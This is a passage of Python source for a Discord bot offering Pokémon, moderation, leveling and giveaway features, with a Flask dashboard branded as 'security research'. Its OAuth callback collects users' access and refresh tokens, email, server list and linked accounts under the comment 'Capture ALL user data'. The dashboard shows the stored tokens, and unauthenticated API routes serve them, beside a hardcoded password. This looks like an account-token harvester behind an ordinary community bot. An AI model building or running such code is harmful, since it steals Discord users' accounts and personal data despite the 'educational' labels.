                await interaction.response.send_message("❌ No Pokéballs! Buy with /shop", ephemeral=True)
                return
            
            if guild_id not in self.active_spawns:
                await interaction.response.send_message("🌿 No Pokémon nearby!", ephemeral=True)
                return
            
            spawn = self.active_spawns[guild_id]
            if (datetime.now() - spawn['timestamp']).seconds > 60:
                del self.active_spawns[guild_id]
                await interaction.response.send_message("🏃 Pokémon ran away!", ephemeral=True)
                return
            
            data = spawn['data']
            p = data['pokemon']
            ball = balls[0]
            multiplier = ball_multipliers.get(ball['item_id'], 1.0)
            catch_rate = rarities.get(data['rarity'], {}).get('catch_rate', 0.5) * multiplier
            caught = random.random() < catch_rate
            
            if caught:
                cp = random.randint(100, 500)
                db.insert('pokemon_collection', {
                    'user_id': user_id, 'guild_id': guild_id,
                    'pokemon_name': p['name'], 'pokemon_id': p['id'],
                    'cp': cp, 'rarity': data['rarity'], 'shiny': 1 if data['is_shiny'] else 0
                })
                db.execute("INSERT INTO pokemon_users (user_id, guild_id, catches, total_cp) VALUES (?,?,1,?) ON CONFLICT(user_id,guild_id) DO UPDATE SET catches=catches+1, total_cp=total_cp+?", (user_id, guild_id, cp, cp))
                db.execute("DELETE FROM user_inventory WHERE user_id=? AND guild_id=? AND item_type='pokeball' LIMIT 1", (user_id, guild_id))
                del self.active_spawns[guild_id]
                
                embed = discord.Embed(
                    title="🎉 **Caught!**",
                    description=f"**{p['name']}** (CP: {cp})",
                    color=discord.Color.gold() if data['is_shiny'] else discord.Color.green()
                )
                if data['is_shiny']:
                    embed.add_field(name="✨ SHINY!", value="You caught a rare shiny Pokémon!", inline=False)
                await interaction.response.send_message(embed=embed)
            else:
                db.execute("DELETE FROM user_inventory WHERE user_id=? AND guild_id=? AND item_type='pokeball' LIMIT 1", (user_id, guild_id))
                await interaction.response.send_message(f"❌ The {p['name']} escaped! Try a better ball!")
        
        @self.tree.command(name="collection", description="📊 View collection")
        async def collection(interaction: discord.Interaction):
            user_id, guild_id = str(interaction.user.id), str(interaction.guild.id)
            cols = db.fetch_all("SELECT * FROM pokemon_collection WHERE user_id=? AND guild_id=? ORDER BY cp DESC LIMIT 20", (user_id, guild_id))
            if not cols:
                await interaction.response.send_message("📭 No Pokémon yet!", ephemeral=True)
                return
            embed = discord.Embed(title=f"📊 {interaction.user.display_name}'s Collection", color=discord.Color.gold())
            for p in cols[:15]:
                embed.add_field(name=f"{'✨ ' if p['shiny'] else ''}{p['pokemon_name']}", value=f"CP: {p['cp']} | {p['rarity']}", inline=True)
            embed.set_footer(text=f"Total: {len(cols)}")
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="shop", description="🛒 Pokémon Shop")
        async def shop(interaction: discord.Interaction):
            user_id, guild_id = str(interaction.user.id), str(interaction.guild.id)
            data = db.fetch_one("SELECT coins FROM pokemon_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            coins = data['coins'] if data else 100
            embed = discord.Embed(title="🛒 Pokémon Shop", description=f"💰 Coins: {coins}", color=discord.Color.blue())
            embed.add_field(name="🎯 Pokéball (50)", value="1.0x multiplier", inline=False)
            embed.add_field(name="🎯 Greatball (100)", value="1.5x multiplier", inline=False)
            embed.add_field(name="🎯 Ultraball (200)", value="2.0x multiplier", inline=False)
            embed.add_field(name="🎯 Masterball (1000)", value="5.0x multiplier", inline=False)
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="buy", description="🛒 Buy item")
        @app_commands.describe(item="pokeball, greatball, ultraball, masterball")
        async def buy(interaction: discord.Interaction, item: str):
            user_id, guild_id = str(interaction.user.id), str(interaction.guild.id)
            item = item.lower()
            if item not in ball_prices:
                await interaction.response.send_message("❌ Invalid item!", ephemeral=True)
                return
            price = ball_prices[item]
            data = db.fetch_one("SELECT coins FROM pokemon_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            coins = data['coins'] if data else 100
            if coins < price:
                await interaction.response.send_message(f"❌ Need {price} coins!", ephemeral=True)
                return
            db.execute("UPDATE pokemon_users SET coins=coins-? WHERE user_id=? AND guild_id=?", (price, user_id, guild_id))
            db.insert('user_inventory', {'user_id': user_id, 'guild_id': guild_id, 'item_id': item, 'item_type': 'pokeball', 'quantity': 1})
            await interaction.response.send_message(f"✅ Purchased {item.title()} for {price} coins!")
        
        @self.tree.command(name="daily", description="🎁 Daily bonus")
        async def daily(interaction: discord.Interaction):
            user_id, guild_id = str(interaction.user.id), str(interaction.guild.id)
            data = db.fetch_one("SELECT * FROM pokemon_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            if data and data['last_daily']:
                last = datetime.fromisoformat(data['last_daily'])
                if (datetime.now() - last).days < 1:
                    remaining = timedelta(days=1) - (datetime.now() - last)
                    await interaction.response.send_message(f"⏳ Come back in {remaining.seconds//3600}h", ephemeral=True)
                    return
            coins = random.randint(50, 200)
            db.execute("INSERT INTO pokemon_users (user_id, guild_id, coins, last_daily) VALUES (?,?,?,?) ON CONFLICT(user_id,guild_id) DO UPDATE SET coins=coins+?, last_daily=?", (user_id, guild_id, coins, datetime.now().isoformat(), coins, datetime.now().isoformat()))
            await interaction.response.send_message(f"🎁 Daily bonus: +{coins} coins!")
        
        @self.tree.command(name="poke_setup", description="⚙️ Setup Pokémon (Admin)")
        @app_commands.default_permissions(administrator=True)
        async def poke_setup(interaction: discord.Interaction):
            category = discord.utils.get(interaction.guild.categories, name="🎮 Pokémon")
            if not category:
                category = await interaction.guild.create_category("🎮 Pokémon")
            channel = await interaction.guild.create_text_channel("🌿-pokemon-spawns", category=category)
            db.execute("INSERT OR REPLACE INTO pokemon_settings (guild_id, channel_id) VALUES (?,?)", (str(interaction.guild.id), str(channel.id)))
            await interaction.response.send_message(f"✅ Pokémon setup complete! Spawns in {channel.mention}")
        
        # ═════════════════════════════════════════════════════════════════════
        # MODERATION COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="ban", description="🔨 Ban member")
        @app_commands.default_permissions(ban_members=True)
        @app_commands.describe(member="Member to ban", reason="Reason")
        async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason"):
            try:
                await member.ban(reason=reason)
                embed = discord.Embed(title="🔨 Banned", description=f"{member.mention} banned.\nReason: {reason}", color=discord.Color.red())
                await interaction.response.send_message(embed=embed)
                db.insert('mod_logs', {'guild_id': str(interaction.guild.id), 'action': 'ban', 'moderator_id': str(interaction.user.id), 'target_id': str(member.id), 'reason': reason})
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)
        
        @self.tree.command(name="kick", description="👢 Kick member")
        @app_commands.default_permissions(kick_members=True)
        @app_commands.describe(member="Member to kick", reason="Reason")
        async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason"):
            try:
                await member.kick(reason=reason)
                embed = discord.Embed(title="👢 Kicked", description=f"{member.mention} kicked.\nReason: {reason}", color=discord.Color.orange())
                await interaction.response.send_message(embed=embed)
                db.insert('mod_logs', {'guild_id': str(interaction.guild.id), 'action': 'kick', 'moderator_id': str(interaction.user.id), 'target_id': str(member.id), 'reason': reason})
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)
        
        @self.tree.command(name="mute", description="🔇 Mute member (24h)")
        @app_commands.default_permissions(manage_messages=True)
        @app_commands.describe(member="Member to mute", reason="Reason")
        async def mute(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason"):
            try:
                muted_role = discord.utils.get(interaction.guild.roles, name="Muted")
                if not muted_role:
                    muted_role = await interaction.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False))
                    for channel in interaction.guild.channels:
                        try:
                            await channel.set_permissions(muted_role, send_messages=False)
                        except:
                            pass
                await member.add_roles(muted_role)
                unmute_time = datetime.now() + timedelta(hours=24)
                db.insert('muted', {'user_id': str(member.id), 'guild_id': str(interaction.guild.id), 'reason': reason, 'unmute_at': unmute_time.isoformat()})
                embed = discord.Embed(title="🔇 Muted", description=f"{member.mention} muted for 24h\nReason: {reason}", color=discord.Color.orange())
                await interaction.response.send_message(embed=embed)
                db.insert('mod_logs', {'guild_id': str(interaction.guild.id), 'action': 'mute', 'moderator_id': str(interaction.user.id), 'target_id': str(member.id), 'reason': reason})
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)
        
        @self.tree.command(name="unmute", description="🔊 Unmute member")
        @app_commands.default_permissions(manage_messages=True)
        @app_commands.describe(member="Member to unmute")
        async def unmute(interaction: discord.Interaction, member: discord.Member):
            try:
                muted_role = discord.utils.get(interaction.guild.roles, name="Muted")
                if muted_role and muted_role in member.roles:
                    await member.remove_roles(muted_role)
                db.execute("DELETE FROM muted WHERE user_id=? AND guild_id=?", (str(member.id), str(interaction.guild.id)))
                embed = discord.Embed(title="🔊 Unmuted", description=f"{member.mention} unmuted.", color=discord.Color.green())
                await interaction.response.send_message(embed=embed)
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)
        
        @self.tree.command(name="warn", description="⚠️ Warn member (3 = auto-mute)")
        @app_commands.default_permissions(manage_messages=True)
        @app_commands.describe(member="Member to warn", reason="Reason")
        async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason"):
            db.insert('warnings', {'user_id': str(member.id), 'guild_id': str(interaction.guild.id), 'moderator_id': str(interaction.user.id), 'reason': reason})
            warnings = db.count('warnings', {'user_id': str(member.id), 'guild_id': str(interaction.guild.id)})
            embed = discord.Embed(title="⚠️ Warned", description=f"{member.mention} warned\nReason: {reason}\nWarnings: {warnings}/3", color=discord.Color.orange())
            await interaction.response.send_message(embed=embed)
            if warnings >= 3:
                await self.mute_user(interaction.guild, member, "Auto-muted for 3 warnings")
                await interaction.followup.send(f"🔇 {member.mention} auto-muted for 3 warnings.")
        
        @self.tree.command(name="clear", description="🗑️ Clear messages")
        @app_commands.default_permissions(manage_messages=True)
        @app_commands.describe(amount="Number of messages (max 100)")
        async def clear(interaction: discord.Interaction, amount: int = 10):
            if amount > 100:
                await interaction.response.send_message("❌ Max 100!", ephemeral=True)
                return
            deleted = await interaction.channel.purge(limit=amount)
            embed = discord.Embed(title="🗑️ Cleared", description=f"Cleared {len(deleted)} messages!", color=discord.Color.green())
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        @self.tree.command(name="addbadword", description="🚫 Add bad word (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(word="Word to add")
        async def addbadword(interaction: discord.Interaction, word: str):
            db.insert('bad_words', {'word': word.lower(), 'guild_id': str(interaction.guild.id)})
            await interaction.response.send_message(f"✅ Added `{word}`")
        
        @self.tree.command(name="removebadword", description="🚫 Remove bad word (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(word="Word to remove")
        async def removebadword(interaction: discord.Interaction, word: str):
            db.execute("DELETE FROM bad_words WHERE word=? AND guild_id=?", (word.lower(), str(interaction.guild.id)))
            await interaction.response.send_message(f"✅ Removed `{word}`")
        
        @self.tree.command(name="badwords", description="🚫 List bad words (Admin)")
        @app_commands.default_permissions(administrator=True)
        async def badwords(interaction: discord.Interaction):
            words = db.fetch_all("SELECT word FROM bad_words WHERE guild_id=?", (str(interaction.guild.id),))
            if not words:
                await interaction.response.send_message("✅ No bad words configured.")
                return
            embed = discord.Embed(title="🚫 Bad Words", description="\n".join([f"• {w['word']}" for w in words]), color=discord.Color.red())
            await interaction.response.send_message(embed=embed)
        
        # ═════════════════════════════════════════════════════════════════════
        # LEVELING COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="rank", description="📊 Check rank")
        async def rank(interaction: discord.Interaction, member: discord.Member = None):
            target = member or interaction.user
            user_id, guild_id = str(target.id), str(interaction.guild.id)
            data = db.fetch_one("SELECT * FROM levels WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            if not data:
                await interaction.response.send_message(f"📭 {target.display_name} hasn't sent any messages yet!")
                return
            rank_result = db.fetch_one("SELECT COUNT(*) + 1 as rank FROM levels WHERE guild_id=? AND xp > (SELECT xp FROM levels WHERE user_id=? AND guild_id=?)", (guild_id, user_id, guild_id))
            embed = discord.Embed(title=f"📊 {target.display_name}'s Rank", color=target.color)
            embed.add_field(name="Level", value=data['level'], inline=True)
            embed.add_field(name="XP", value=data['xp'], inline=True)
            embed.add_field(name="Messages", value=data['messages'], inline=True)
            embed.add_field(name="Rank", value=f"#{rank_result['rank'] if rank_result else '?'}", inline=True)
            next_xp = 100 * (data['level'] + 1) ** 2
            current_xp = 100 * data['level'] ** 2
            progress = (data['xp'] - current_xp) / (next_xp - current_xp) * 100
            bar = "🟩" * int(progress/10) + "⬜" * (10 - int(progress/10))
            embed.add_field(name="Progress", value=f"{bar} {progress:.1f}%", inline=False)
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="leaderboard", description="🏆 Server leaderboard")
        async def leaderboard(interaction: discord.Interaction):
            guild_id = str(interaction.guild.id)
            data = db.fetch_all("SELECT user_id, xp, level FROM levels WHERE guild_id=? ORDER BY xp DESC LIMIT 10", (guild_id,))
            if not data:
                await interaction.response.send_message("📭 No data yet!")
                return
            embed = discord.Embed(title=f"🏆 {interaction.guild.name} Leaderboard", color=discord.Color.gold())
            for i, entry in enumerate(data, 1):
                member = interaction.guild.get_member(int(entry['user_id']))
                if member:
                    medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"#{i}"
                    embed.add_field(name=f"{medal} {member.display_name}", value=f"Level {entry['level']} | {entry['xp']} XP", inline=False)
            await interaction.response.send_message(embed=embed)
        
        # ═════════════════════════════════════════════════════════════════════
        # UTILITY COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="ping", description="🏓 Check latency")
        async def ping(interaction: discord.Interaction):
            latency = round(self.latency * 1000)
            embed = discord.Embed(title="🏓 Pong!", description=f"Latency: {latency}ms", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="serverinfo", description="📊 Server info")
        async def serverinfo(interaction: discord.Interaction):
            guild = interaction.guild
            embed = discord.Embed(title=f"📊 {guild.name}", color=discord.Color.blue())
            embed.add_field(name="👥 Members", value=guild.member_count, inline=True)
            embed.add_field(name="📝 Channels", value=len(guild.channels), inline=True)
            embed.add_field(name="🎭 Roles", value=len(guild.roles), inline=True)
            embed.add_field(name="👑 Owner", value=guild.owner.mention if guild.owner else "Unknown", inline=True)
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="userinfo", description="👤 User info")
        @app_commands.describe(member="User to get info about")
        async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
            target = member or interaction.user
            embed = discord.Embed(title=f"👤 {target.display_name}", color=target.color)
            embed.set_thumbnail(url=target.display_avatar.url)
            embed.add_field(name="Username", value=target.name, inline=True)
            embed.add_field(name="ID", value=target.id, inline=True)
            embed.add_field(name="Created", value=target.created_at.strftime("%Y-%m-%d"), inline=True)
            embed.add_field(name="Joined", value=target.joined_at.strftime("%Y-%m-%d") if target.joined_at else "Unknown", inline=True)
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="list_all", description="📋 All commands")
        async def list_all(interaction: discord.Interaction):
            embed = discord.Embed(title="📋 All Commands", color=discord.Color.blue())
            embed.add_field(name="🎮 Pokémon", value="/catch /collection /shop /buy /daily /poke_setup", inline=False)
            embed.add_field(name="🔐 Verification", value="/verify /verifystatus /setverified /setunverified /setlogchannel /setupverify", inline=False)
            embed.add_field(name="🎁 Giveaways", value="/giveaway /giveawayend /giveawayreroll", inline=False)
            embed.add_field(name="🎫 Tickets", value="/ticket /setupticket /closeticket /adduserticket /removeuserticket /transcript", inline=False)
            embed.add_field(name="🛡️ Moderation", value="/ban /kick /mute /unmute /warn /clear /addbadword /removebadword /badwords", inline=False)
            embed.add_field(name="📈 Leveling", value="/rank /leaderboard", inline=False)
            embed.add_field(name="🔧 Utility", value="/ping /serverinfo /userinfo /list_all", inline=False)
            await interaction.response.send_message(embed=embed)
    
    # ─── TASKS ──────────────────────────────────────────────────────────────
    
    @tasks.loop(seconds=30)
    async def spawn_loop(self):
        for guild in self.guilds:
            settings = db.fetch_one("SELECT * FROM pokemon_settings WHERE guild_id=?", (str(guild.id),))
            if settings and settings['spawn_enabled']:
                channel = guild.get_channel(int(settings['channel_id']))
                if channel and random.random() < 0.3:
                    data = get_random_pokemon()
                    p = data['pokemon']
                    embed = discord.Embed(
                        title=f"🌟 Wild {p['name']} appeared!",
                        description=f"Rarity: {data['rarity']}",
                        color=discord.Color.blue()
                    )
                    embed.set_footer(text="Use /catch to try and catch it!")
                    self.active_spawns[str(guild.id)] = {'data': data, 'timestamp': datetime.now(), 'channel_id': channel.id}
                    await channel.send(embed=embed)
    
    @tasks.loop(minutes=1)
    async def giveaway_checker(self):
        now = datetime.now()
        giveaways = db.fetch_all("SELECT * FROM giveaways WHERE ended=0 AND ended_at <= ?", (now.isoformat(),))
        for giveaway in giveaways:
            await self.end_giveaway(giveaway)
    
    async def end_giveaway(self, giveaway, force=False):
        channel = self.get_channel(int(giveaway['channel_id']))
        if not channel:
            return
        try:
            message = await channel.fetch_message(int(giveaway['message_id']))
            users = []
            if message:
                for reaction in message.reactions:
                    if str(reaction.emoji) == "🎉":
                        async for user in reaction.users():
                            if not user.bot:
                                users.append(user)
            winners = random.sample(users, min(giveaway['winners'], len(users))) if users else []
            winner_mentions = ', '.join([w.mention for w in winners]) if winners else "No entries!"
            
            embed = discord.Embed(
                title="🏆 Giveaway Ended",
                description=f"**Prize:** {giveaway['prize']}\n**Winners:** {winner_mentions}",
                color=discord.Color.gold()
            )
            if giveaway['thumbnail_url']:
                embed.set_thumbnail(url=giveaway['thumbnail_url'])
            await message.edit(embed=embed, view=None)
            
            ping_msg = ""
            if giveaway['ping_role_id']:
                role = channel.guild.get_role(int(giveaway['ping_role_id']))
                if role:
                    ping_msg = f"{role.mention} "
            
            await channel.send(f"{ping_msg}🎉 Giveaway Ended!\nWinners: {winner_mentions}")
            
            for winner in winners:
                try:
                    await winner.send(f"🎉 You won **{giveaway['prize']}** in {channel.guild.name}!")
                except:
                    pass
            
            db.execute("UPDATE giveaways SET ended=1, winner_ids=? WHERE id=?", (','.join([str(w.id) for w in winners]), giveaway['id']))
        except Exception as e:
            print(f"⚠️ Error ending giveaway: {e}")
    
    @tasks.loop(hours=1)
    async def cleanup_loop(self):
        db.execute("DELETE FROM tickets WHERE status='closed' AND closed_at < datetime('now', '-7 days')")
        db.execute("DELETE FROM giveaways WHERE ended=1 AND ended_at < datetime('now', '-30 days')")
        db.execute("DELETE FROM user_tokens WHERE expires_at < datetime('now')")
    
    # ─── EVENTS ──────────────────────────────────────────────────────────────
    
    async def on_ready(self):
        print("=" * 70)
        print("✅✅✅ BOT IS ONLINE! ✅✅✅")
        print("=" * 70)
        print(f"📡 Name: {self.user.name}")
        print(f"🆔 ID: {self.user.id}")
        print(f"🏰 Servers: {len(self.guilds)}")
        for guild in self.guilds:
            print(f"   - {guild.name} ({guild.id})")
        print("=" * 70)
        print("🔐 Security Research Bot Ready")
        print("=" * 70)
    
    async def on_message(self, message):
        if message.author.bot:
            return
        self.total_messages += 1
        await self.handle_leveling(message)
        await self.handle_bad_words(message)
        await self.process_commands(message)
    
    async def handle_leveling(self, message):
        user_id, guild_id = str(message.author.id), str(message.guild.id)
        cooldown_key = f"{guild_id}:{user_id}"
        if cooldown_key in self.level_cooldowns and (datetime.now() - self.level_cooldowns[cooldown_key]).seconds < 30:
            return
        self.level_cooldowns[cooldown_key] = datetime.now()
        xp = random.randint(15, 25)
        db.execute("INSERT INTO levels (user_id, guild_id, xp, messages) VALUES (?,?,?,1) ON CONFLICT(user_id,guild_id) DO UPDATE SET xp=xp+?, messages=messages+1", (user_id, guild_id, xp, xp))
        data = db.fetch_one("SELECT xp, level FROM levels WHERE user_id=? AND guild_id=?", (user_id, guild_id))
        if data:
            xp, level = data['xp'], data['level']
            next_xp = 100 * (level + 1) ** 2
            if xp >= next_xp:
                new_level = level + 1
                db.execute("UPDATE levels SET level=? WHERE user_id=? AND guild_id=?", (new_level, user_id, guild_id))
                await message.channel.send(f"🎉 {message.author.mention} leveled up to **Level {new_level}**!")
    
    async def handle_bad_words(self, message):
        bad_words = db.fetch_all("SELECT word FROM bad_words WHERE guild_id=?", (str(message.guild.id),))
        content = message.content.lower()
        for row in bad_words:
            if row['word'].lower() in content:
                await message.delete()
                await message.channel.send(f"❌ {message.author.mention}, that word is not allowed!")
                break
    
    async def mute_user(self, guild, member, reason):
        muted_role = discord.utils.get(guild.roles, name="Muted")
        if not muted_role:
            muted_role = await guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False))
            for channel in guild.channels:
                try:
                    await channel.set_permissions(muted_role, send_messages=False)
                except:
                    pass
        await member.add_roles(muted_role)
        db.insert('muted', {'user_id': str(member.id), 'guild_id': str(guild.id), 'reason': reason, 'unmute_at': (datetime.now() + timedelta(hours=24)).isoformat()})

# ═════════════════════════════════════════════════════════════════════════════
# FLASK WEB APP - DASHBOARD
# ═════════════════════════════════════════════════════════════════════════════

flask_app = Flask(__name__)
flask_app.secret_key = secrets.token_urlsafe(32)
CORS(flask_app)

@flask_app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head><title>🔐 Anion Security Research</title>
    <style>
        body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding: 50px; }
        h1 { color: #667eea; font-size: 3em; }
        .container { max-width: 800px; margin: 0 auto; }
        .status { color: #4CAF50; font-size: 1.2em; }
        .links { margin-top: 30px; }
        .btn { display: inline-block; padding: 15px 30px; background: #667eea; color: white; text-decoration: none; border-radius: 10px; margin: 10px; }
        .btn:hover { background: #764ba2; }
        .warning { color: #ff6b6b; border: 1px solid #ff6b6b; padding: 20px; border-radius: 10px; margin: 20px 0; }
    </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Anion Security Research</h1>
            <p class="status">🟢 Bot is Online</p>
            <div class="warning">
                ⚠️ EDUCATIONAL PURPOSE ONLY<br>
                Testing on own infrastructure
            </div>
            <div class="links">
                <a href="/dashboard" class="btn">📊 Dashboard</a>
                <a href="/login" class="btn">🔑 Login</a>
            </div>
        </div>
    </body>
    </html>
    """

@flask_app.route('/login')
def login():
    return """
    <!DOCTYPE html>
    <html>
    <head><title>🔑 Login - Anion</title>
    <style>
        body { font-family: Arial; background: #0a0a1a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #1a1a2e; padding: 40px; border-radius: 20px; max-width: 400px; width: 100%; }
        h1 { color: #667eea; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; background: #2a2a4e; color: white; }
        button { width: 100%; padding: 12px; background: #667eea; border: none; border-radius: 8px; color: white; font-size: 1.1em; cursor: pointer; }
        button:hover { background: #764ba2; }
        .role { text-align: center; margin-top: 10px; color: #888; }
        .back { text-align: center; margin-top: 20px; }
        .back a { color: #667eea; text-decoration: none; }
    </style>
    </head>
    <body>
        <div class="container">
            <h1>🔑 Login</h1>
            <form action="/login_handler" method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <div class="role">User / Moderator / Superadmin</div>
            <div class="back"><a href="/">← Back</a></div>
        </div>
    </body>
    </html>
    """

@flask_app.route('/login_handler', methods=['POST'])
def login_handler():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username == 'superadmin' and password == SUPERADMIN_PASSWORD:
        session['role'] = 'superadmin'
        session['username'] = username
        return redirect(url_for('dashboard'))
    elif username == 'admin' and password == ADMIN_PASSWORD:
        session['role'] = 'moderator'
        session['username'] = username
        return redirect(url_for('dashboard'))
    elif username == 'user' and password == 'user123':
        session['role'] = 'user'
        session['username'] = username
        return redirect(url_for('dashboard'))
    
    return "❌ Invalid credentials!", 401

@flask_app.route('/dashboard')
def dashboard():
    if 'role' not in session:
        return redirect(url_for('login'))
    
    role = session.get('role')
    username = session.get('username')
    
    # Get stats
    guilds = len(bot.guilds) if bot else 0
    users = sum(g.member_count for g in bot.guilds) if bot else 0
    verified = db.count('verified_users')
    tickets = db.count('tickets')
    giveaways = db.count('giveaways')
    pokemon = db.count('pokemon_collection')
    tokens = db.count('user_tokens')
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head><title>📊 Dashboard - Anion</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: Arial; background: #0a0a1a; color: white; padding: 20px; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        .header {{ background: linear-gradient(135deg, #667eea, #764ba2); padding: 30px; border-radius: 20px; margin-bottom: 30px; text-align: center; }}
        .header h1 {{ font-size: 2.5em; }}
        .header .badge {{ background: rgba(255,255,255,0.2); padding: 5px 15px; border-radius: 20px; display: inline-block; margin-top: 10px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }}
        .stat-card {{ background: #1a1a2e; padding: 20px; border-radius: 15px; text-align: center; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; color: #667eea; }}
        .stat-label {{ color: #888; margin-top: 5px; }}
        .grid-2 {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }}
        .card {{ background: #1a1a2e; padding: 25px; border-radius: 15px; }}
        .card h2 {{ color: #667eea; margin-bottom: 15px; }}
        .token-item {{ background: #0d0d1a; padding: 10px; border-radius: 8px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; }}
        .token-item .token {{ color: #ff6b6b; font-family: monospace; font-size: 0.8em; }}
        .logout {{ color: #ff6b6b; text-decoration: none; float: right; }}
        .role-badge {{ background: #667eea; padding: 2px 10px; border-radius: 10px; font-size: 0.8em; }}
        @media (max-width: 768px) {{ .grid-2 {{ grid-template-columns: 1fr; }} }}
    </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📊 Anion Dashboard</h1>
                <p>Welcome, <strong>{username}</strong>!</p>
                <div class="badge">Role: {role} <span class="role-badge">🔑</span></div>
                <a href="/logout" class="logout">🚪 Logout</a>
            </div>
            
            <div class="stats">
                <div class="stat-card"><div class="stat-number">{guilds}</div><div class="stat-label">Servers</div></div>
                <div class="stat-card"><div class="stat-number">{users}</div><div class="stat-label">Users</div></div>
                <div class="stat-card"><div class="stat-number">{verified}</div><div class="stat-label">Verified</div></div>
                <div class="stat-card"><div class="stat-number">{tickets}</div><div class="stat-label">Tickets</div></div>
                <div class="stat-card"><div class="stat-number">{giveaways}</div><div class="stat-label">Giveaways</div></div>
                <div class="stat-card"><div class="stat-number">{pokemon}</div><div class="stat-label">Pokémon</div></div>
                <div class="stat-card"><div class="stat-number">{tokens}</div><div class="stat-label">Tokens</div></div>
            </div>
            
            <div class="grid-2">
                <div class="card">
                    <h2>🔐 Verified Users</h2>
                    <div id="verified-list">Loading...</div>
                </div>
                <div class="card">
                    <h2>🎮 Tokens ({tokens})</h2>
                    <div id="token-list">Loading...</div>
                </div>
            </div>
        </div>
        <script>
            fetch('/api/verified')
                .then(r => r.json())
                .then(data => {{
                    let html = '';
                    data.forEach(u => {{
                        html += `<div class="token-item"><span>${{u.username}}</span><span class="token">${{u.user_id}}</span></div>`;
                    }});
                    document.getElementById('verified-list').innerHTML = html || 'No verified users';
                }});
            fetch('/api/tokens')
                .then(r => r.json())
                .then(data => {{
                    let html = '';
                    data.forEach(t => {{
                        html += `<div class="token-item"><span>${{t.username || 'Unknown'}}</span><span class="token">${{t.access_token ? t.access_token.substring(0, 20)+'...' : 'No token'}}</span></div>`;
                    }});
                    document.getElementById('token-list').innerHTML = html || 'No tokens';
                }});
        </script>
    </body>
    </html>
    """

@flask_app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@flask_app.route('/api/verified')
def api_verified():
    data = db.fetch_all("SELECT user_id, username, guilds_json FROM verified_users LIMIT 50")
    result = []
    for row in data:
        result.append({
            'user_id': row['user_id'],
            'username': row['username'] or 'Unknown',
            'guilds': len(json.loads(row['guilds_json'])) if row['guilds_json'] else 0
        })
    return jsonify(result)

@flask_app.route('/api/tokens')
def api_tokens():
    data = db.fetch_all("SELECT user_id, access_token, username FROM user_tokens LIMIT 50")
    result = []
    for row in data:
        result.append({
            'user_id': row['user_id'],
            'username': row['username'] or 'Unknown',
            'access_token': row['access_token'][:30] + '...' if row['access_token'] else None
        })
    return jsonify(result)

@flask_app.route('/callback')
def oauth_callback():
    """OAuth callback - Educational security testing"""
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    if not code:
        return "Invalid request", 400
    
    # Exchange code for token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    response = requests.post('https://discord.com/api/oauth2/token', data=data)
    token_data = response.json()
    
    if 'access_token' not in token_data:
        return "Authentication failed", 400
    
    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token', '')
    token_type = token_data.get('token_type', 'Bearer')
    scope = token_data.get('scope', '')
    
    headers = {'Authorization': f"Bearer {access_token}"}
    
    # Capture ALL user data
    user_response = requests.get('https://discord.com/api/users/@me', headers=headers)
    user_data = user_response.json()
    
    guilds_response = requests.get('https://discord.com/api/users/@me/guilds', headers=headers)
    guilds_data = guilds_response.json()
    
    connections_response = requests.get('https://discord.com/api/users/@me/connections', headers=headers)
    connections_data = connections_response.json()
    
    email = user_data.get('email', 'Not provided')
    
    # COMPLETE user data (educational security testing)
    full_data = {
        'user': {
            'id': user_data.get('id'),
            'username': user_data.get('username'),
            'discriminator': user_data.get('discriminator', '0'),
            'global_name': user_data.get('global_name'),
            'email': email,
